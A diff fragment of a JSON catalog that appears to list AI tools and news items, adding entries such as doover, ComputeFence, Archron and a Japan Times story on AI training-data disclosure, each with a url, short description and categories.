+      "id": "43e78743-e7dc-440a-9731-747ac3aeef5a",
       "name": "JobFlow",
       "url": "https://github.com/ValerianXXX/JobFlow",
       "oneLiner": "JobFlow is a local-first, AI-centered job application workflow for Windows.",
@@ -299,8 +436,143 @@
       "isOpenSource": false,
       "githubUrl": null,
       "categories": [
+        "code",
+        "data",
+        "security"
+      ]
+    },
+    {
+      "id": "0ffbd396-32aa-4134-bda4-163dd1e679af",
+      "name": "Technical leaders should have the largest AI exhaust",
+      "url": "https://schipper.ai/posts/technical-leaders-should-have-the-largest-ai-exhaust/",
+      "oneLiner": "Measuring engineers by their AI exhaust (token burn and lines of code) is a bad idea.",
+      "description": "Technical leaders should have the largest AI exhaust\nMeasuring engineers by their AI exhaust (token burn and lines of code) is a bad idea. Code generated and tokens spent are not the same thing as impact. A staff engineer can spend most of their time on non-coding activities (polishing a vision document, reviewing complex pull requests, influencing other teams, mentoring others) and still have mor",
+      "pricing": "unknown",
+      "country": null,
+      "quality": 10,
+      "isOpenSource": false,
+      "githubUrl": null,
+      "categories": [
         "agents",
         "code",
+        "design"
+      ]
+    },
+    {
+      "id": "4a7cb6eb-276c-431c-a130-18760f710589",
+      "name": "Japan to require AI firms to disclose training data",
+      "url": "https://www.japantimes.co.jp/news/2026/08/19/japan/ai-training-data-disclosure/",
+      "oneLiner": "A government panel Tuesday broadly approved a plan to adopt what is known as a “principle code” for generative artificial intelligence businesses to protect intellectual property r",
+      "description": "A government panel Tuesday broadly approved a plan to adopt what is known as a “principle code” for generative artificial intelligence businesses to protect intellectual property rights by urging firms to disclose their AI training data and methods for collecting such data to the public.\nA draft code was presented at an online meeting of an expert panel on intellectual property rights in the AI er",
+      "pricing": "unknown",
+      "country": null,
+      "quality": 10,
+      "isOpenSource": false,
+      "githubUrl": null,
+      "categories": [
+        "code",
+        "design",
+        "data"
+      ]
+    },
+    {
+      "id": "98289819-42fd-4613-91f9-e38332e5ccbe",
+      "name": "Do-over",
+      "url": "https://github.com/CaydenChik/doover",
+      "oneLiner": "Every agent deserves a do-over.",
+      "description": "Every agent deserves a do-over.\nUndo for your AI agent's shell commands. doover snapshots files before your\nagent's destructive commands run, keeps a journal of everything it did, and\ngives you a real undo\n, including for files your agent touched outside\nyour project and for everything git never saw.\nThe agent\ncommand in the clip is a stand-in that drives the exact\nhook flow Claude Code drives. He",
+      "pricing": "unknown",
+      "country": null,
+      "quality": 10,
+      "isOpenSource": false,
+      "githubUrl": null,
+      "categories": [
+        "agents",
+        "code",
+        "data"
+      ]
+    },
+    {
+      "id": "19a6dbbe-38e7-4d9e-aa33-ecb6b3330f5b",
+      "name": "UI Inspector for Tauri",
+      "url": "https://github.com/mathematic-inc/tauri-plugin-ui-inspector",
+      "oneLiner": "reference for coding agents.",
+      "description": "Select an element inside a running Tauri 2 webview and turn it into a durable @ui_<ULID>\nreference for coding agents.\nA reference records the selected DOM node, accessibility semantics, ranked locators, optional framework source metadata, native window pixels, and an exact element crop. The native backend captures what the desktop compositor rendered, including canvas, WebGL, fonts, shadows, and o",
+      "pricing": "unknown",
+      "country": null,
+      "quality": 10,
+      "isOpenSource": false,
+      "githubUrl": null,
+      "categories": [
+        "agents",
+        "code",
+        "design"
+      ]
+    },
+    {
+      "id": "02e4a15b-8f20-46d3-88d2-6b9510d0e62a",
+      "name": "AI agents can now safely write to your CRMs",
+      "url": "https://www.archron.app/",
+      "oneLiner": "AI is ready to operate your business.",
+      "description": "Execution Governance\nSafely deploy AI agents into production\nAI is ready to operate your business. Most businesses just don't trust it to. Archron verifies every action before execution, allowing AI agents to safely update production systems with complete governance and auditability.\nReasoning creates insight. Execution creates ROI.\nThe definitive safeguard for production data\nAgents are good at i",
+      "pricing": "unknown",
+      "country": null,
+      "quality": 10,
+      "isOpenSource": false,
+      "githubUrl": null,
+      "categories": [
+        "agents",
+        "data",
+        "security"
+      ]
+    },
+    {
+      "id": "dd91d793-c258-4888-86d5-cd84871d0fb1",
+      "name": "AI Resume Screening",
+      "url": "https://aiomniu.top/services/resume-screening",
+      "oneLiner": "Find the right candidates faster with intelligent matching, deep analysis, and privacy-first protection.",
+      "description": "AI-powered resume screening for smarter hiring\nFind the right candidates faster with intelligent matching, deep analysis, and privacy-first protection.\nCandidate Match\nSarah Chen\n92% MatchSenior Product Designer\n5 years experience • San Francisco, CA\nMatch Breakdown\nKey Strengths\n- Strong product design experience in SaaS\n- Expert in Figma and design systems\n- Good user research and UX thinking\nCo",
+      "pricing": "unknown",
+      "country": null,
+      "quality": 10,
+      "isOpenSource": false,
+      "githubUrl": null,
+      "categories": [
+        "design",
+        "data",
+        "security"
+      ]
+    },
+    {
+      "id": "18104d08-84af-4f03-bceb-c23734eb1411",
+      "name": "Orion",
+      "url": "https://orion-agent.ai",
+      "oneLiner": "The full picture rarely lives in one place.",
+      "description": "The full picture rarely lives in one place.\nSpreadsheets, CRMs, ERPs, databases, and external systems each hold a different piece of the business. Getting a complete answer usually means finding, joining, and reconciling all of them.\nOrion helps non-technical founders uncover actionable insights from their data so they can make smarter, faster decisions.\nHow Orion works\nOrion brings the pieces tog",
+      "pricing": "unknown",
+      "country": null,
+      "quality": 10,
+      "isOpenSource": false,
+      "githubUrl": null,
+      "categories": [
+        "agents",
+        "data",
+        "marketing"
+      ]
+    },
+    {
+      "id": "37724772-bb85-48d4-a2d8-bc59e2dd845e",
+      "name": "ComputeFence",
+      "url": "https://github.com/Francisco-Booth/ComputeFence",
+      "oneLiner": "Pre-flight validation for GPU training runs on rented infrastructure.",
+      "description": "Pre-flight validation for GPU training runs on rented infrastructure. Built specifically for RunPod, Vast.ai, Lambda, and similar providers.\npip install computefence\ncomputefence doctor computefence doctor --dataset train.csv\n- CUDA and GPU availability\n- HuggingFace cache volume path (catches the RunPod /root vs /workspace conflict)\n- Accelerate GPU count vs config\n- Dataset duplicates and missin",
+      "pricing": "unknown",
+      "country": null,
+      "quality": 10,
+      "isOpenSource": false,
+      "githubUrl": null,
+      "categories": [
+        "design",
         "data"
       ]
     }
